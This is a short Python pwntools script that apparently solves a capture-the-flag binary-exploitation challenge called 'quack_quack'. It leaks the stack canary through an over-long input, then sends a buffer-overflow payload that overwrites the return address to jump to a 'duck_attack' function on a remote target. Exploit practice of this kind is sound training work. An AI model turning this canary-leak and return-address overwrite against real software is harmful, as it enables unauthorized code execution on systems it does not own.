from pwn import *

payload = b'A' * (0x65 - len("Quack Quack ")) + b"Quack Quack "

# p = process("/mnt/c/Users/gh0st69/Downloads/challenge/quack_quack")
p = remote(*(sys.argv[1].split(":")))
p.sendlineafter(b">", payload)

p.recvuntil(b"Quack Quack ")

canary = u64(p.recv(7).rjust(8, b'\x00'))
print(f'[+] canary_found: 0x{canary:02x}')

payload = b"gh0st699" * (0xb) # padding 
payload += p64(canary) # stack_canary
payload += b"gh0st699" # rsp
payload += p64(0x000000000040137f) # duck_attack

p.sendlineafter(b">", payload)
p.interactive()
